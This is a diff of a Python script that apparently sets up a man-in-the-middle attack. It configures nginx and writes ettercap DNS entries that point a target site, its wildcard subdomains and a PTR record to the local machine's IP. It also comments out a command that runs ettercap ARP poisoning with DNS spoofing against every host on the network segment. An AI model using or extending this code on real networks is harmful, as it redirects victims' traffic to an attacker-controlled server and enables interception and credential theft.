@@ -27,7 +27,8 @@ def ip_addr():
 
 def ettercap_dns():
 	path = "/etc/ettercap/etter.dns"
-	text = [SITE + " A " + ip_addr()]
+	ip = ip_addr()
+	text = [SITE[4:] + " A " + ip, "\n", "*" + SITE[3:] + " A " + ip, "\n", SITE + " PTR " + ip]
 	with open(path, 'w') as file:
                 file.writelines(text)
 	return 0
@@ -38,7 +39,7 @@ def main():
 	nginx_config()
 	os.system("systemctl restart nginx")
 	ettercap_dns()
-	os.system("ettercap -T -q -M arp -P dns_spoof /// ///")
+	#os.system("ettercap -T -q -M arp -P dns_spoof /// ///")
 	return 0
 
 if __name__ == '__main__':
